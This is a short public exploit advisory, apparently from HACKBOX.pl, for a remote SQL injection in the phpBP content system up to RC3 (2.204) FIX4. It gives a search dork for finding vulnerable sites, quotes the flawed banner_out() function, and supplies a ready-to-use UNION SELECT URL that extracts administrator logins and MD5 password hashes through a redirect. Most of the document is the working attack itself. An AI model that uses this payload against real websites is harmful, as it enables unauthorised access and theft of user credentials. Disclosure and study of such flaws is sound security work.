phpBP <= RC3 (2.204) FIX4 Remote SQL Injection Vulnerability
============================================================



.-----------------------------------------------------------------------------.
|  vuln.: phpBP <= RC3 (2.204) FIX4 Remote SQL Injection Vulnerability        |
|  download: http://www.phpbp.com/                                            |
|  dork: "PHP BP Team"                                                        |
|                                                                             |
|                                                                             |
|                        --->    HACKBOX.pl    <---                           |
|                                                                             |
&#039;-----------------------------------------------------------------------------&#039;

# code:

 ./includes/functions/banners-external.php:
 ...
3   function banner_out() //zlicza ilosc klikniec na banner
4   {
5    global $conf;
6 
7    if($_GET[&#039;id&#039;])
8    {
9     SQLvalidate($_POST[&#039;id&#039;]);
10
11    $db = new dbquery;
13 
14    if($db->num_rows()==0)
15    {
16     redirect(&#039;index.php?module=error?error=banners_error2&#039;);
17     exit;
18    } 
19 
20    $d=$db->fetch_object();
22 
23    redirect($d->url);
24   }
25
26   exit;
27  }
 ...

# exploit:

http://[host]/[path]/index.php?function=banner_out&id=10000/**/LIMIT/**/0/**/UNION/**/SELECT/**/1,2,concat(0x687474703A2F2F,login,0x5F,pass),4,5,6,7,8,9/**/FROM/**/phpbp_users/**/LIMIT/**/1/*

you will be redirect to http://[login]_[md5_hash_pass] (ex. http://admin_21232f297a57a5a743894a0e4a801fc3/)



